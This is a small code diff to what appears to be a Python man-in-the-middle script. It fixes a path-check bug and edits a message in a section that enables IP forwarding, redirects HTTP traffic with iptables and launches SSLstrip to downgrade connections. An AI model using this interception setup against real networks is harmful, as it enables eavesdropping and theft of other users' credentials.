@@ -79,10 +79,10 @@ subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()
 # Enable SSLSTRIP
 ssl_strip_on = raw_input('Beta! Do you want to enable SSLSTRIP?\n y/n: ')
 if ssl_strip_on == 'y':
-    if os.file.isfile('/usr/bin/sslstrip'):
+    if os.path.isfile('/usr/bin/sslstrip'):
         print('setting up iptables')
         subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'])
-        print('starting sslstrip')
+        print('starting sslstrip in seperate terminal')
         subprocess.call(['gnome-terminal', '-x', 'sslstrip', '-l', '8080'])
     else:
         print('Cant find SSLSTRIP, please make sure kalel\ncan locate it in /usr/bin/')
